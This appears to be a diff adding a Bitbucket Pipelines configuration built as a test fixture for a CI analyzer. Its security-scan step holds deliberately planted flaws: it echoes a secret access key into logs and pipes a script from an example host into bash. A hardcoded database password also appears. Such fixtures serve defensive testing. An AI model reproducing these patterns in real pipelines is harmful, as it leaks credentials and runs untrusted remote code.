@@ -1,0 +1,160 @@
+# This is a complex Bitbucket Pipelines configuration for testing purposes.
+# It includes various features to test the robustness of the analyzer.
+
+options:
+  docker: true # Enable Docker for all steps
+  size: 2x # Use a larger build size
+  max-time: 120 # Max build time in minutes
+
+definitions:
+  services:
+    postgres:
+      image: postgres:13.3
+      environment:
+        POSTGRES_DB: test_db
+        POSTGRES_USER: user
+        POSTGRES_PASSWORD: password
+    redis:
+      image: redis:6.2.5
+  caches:
+    node-modules: ~/.npm
+    maven-repo: ~/.m2/repository
+  steps:
+    - step: &build-frontend
+        name: Build Frontend
+        image: node:16.14.0
+        caches:
+          - node-modules
+        script:
+          - npm install
+          - npm run build
+        artifacts:
+          - build/**
+    - step: &run-unit-tests
+        name: Run Unit Tests
+        image: python:3.9
+        script:
+          - pip install -r requirements.txt
+          - python -m pytest
+    - step: &deploy-to-staging
+        name: Deploy to Staging
+        deployment: staging
+        script:
+          - echo "Deploying to staging..."
+          - pipe: atlassian/s3-deploy:1.2.0
+            variables:
+              AWS_ACCESS_KEY_ID: $AWS_ACCESS_KEY_ID
+              AWS_SECRET_ACCESS_KEY: $AWS_SECRET_ACCESS_KEY
+              S3_BUCKET: 'my-staging-bucket'
+              LOCAL_PATH: 'build'
+    - step: &security-scan
+        name: Security Scan
+        image: docker/whalesay
+        script:
+          - echo "Running security scan..."
+          - echo "Access Key: $MY_SECRET_ACCESS_KEY" # Intentional vulnerability
+          - curl -sSL https://insecure.example.com/script.sh | bash # Insecure script download
+          - echo "Scan complete."
+
+pipelines:
+  default:
+    - step: *build-frontend
+    - parallel:
+        - step: *run-unit-tests
+        - step:
+            name: Run Integration Tests
+            image: openjdk:11-jdk
+            services:
+              - postgres
+              - redis
+            script:
+              - mvn clean install
+              - mvn integration-test
+            caches:
+              - maven-repo
+    - step:
+        name: Lint Code
+        image: python:3.9
+        script:
+          - pip install flake8
+          - flake8 .
+        size: 1x # Smaller size for linting
+        max-time: 30 # Shorter timeout
+    - step:
+        name: Build Docker Image
+        image: docker/compose:1.29.2
+        script:
+          - docker build -t my-app:latest . # Using latest tag
+          - docker push my-app:latest
+        caches:
+          - docker
+        artifacts:
+          - docker-image-id.txt
+
+  branches:
+    main:
+      - step: *build-frontend
+      - step: *run-unit-tests
+      - step: *security-scan
+      - step: *deploy-to-staging
+      - step:
+          name: Deploy to Production
+          deployment: production
+          trigger: manual # Manual trigger for production
+          script:
+            - echo "Deploying to production..."
+            - pipe: atlassian/s3-deploy:1.2.0
+              variables:
+                AWS_ACCESS_KEY_ID: $AWS_ACCESS_KEY_ID
+                AWS_SECRET_ACCESS_KEY: $AWS_SECRET_ACCESS_KEY
+                S3_BUCKET: 'my-prod-bucket'
+                LOCAL_PATH: 'build'
+    develop:
+      - step: *build-frontend
+      - step: *run-unit-tests
+      - step:
+          name: Deploy to Dev
+          deployment: dev
+          script:
+            - echo "Deploying to dev..."
+            - pipe: atlassian/s3-deploy:1.2.0
+              variables:
+                AWS_ACCESS_KEY_ID: $AWS_ACCESS_KEY_ID
+                AWS_SECRET_ACCESS_KEY: $AWS_SECRET_ACCESS_KEY
+                S3_BUCKET: 'my-dev-bucket'
+                LOCAL_PATH: 'build'
+
+  tags:
+    'v*':
+      - step: *build-frontend
+      - step: *run-unit-tests
+      - step: *security-scan
+      - step: *deploy-to-staging
+
+  pull-requests:
+    '**':
+      - step: *build-frontend
+      - step: *run-unit-tests
+      - step:
+          name: Code Quality Check
+          image: sonarsource/sonar-scanner-cli
+          script:
+            - sonar-scanner
+          condition:
+            changesets:
+              include:
+                - src/**
+                - pom.xml
+              exclude:
+                - docs/**
+
+  custom:
+    run-manual-scan:
+      - step: *security-scan
+    cleanup-old-artifacts:
+      - step:
+          name: Clean Old Artifacts
+          image: alpine/git
+          script:
+            - echo "Cleaning up old artifacts..."
+            - rm -rf old-artifacts/
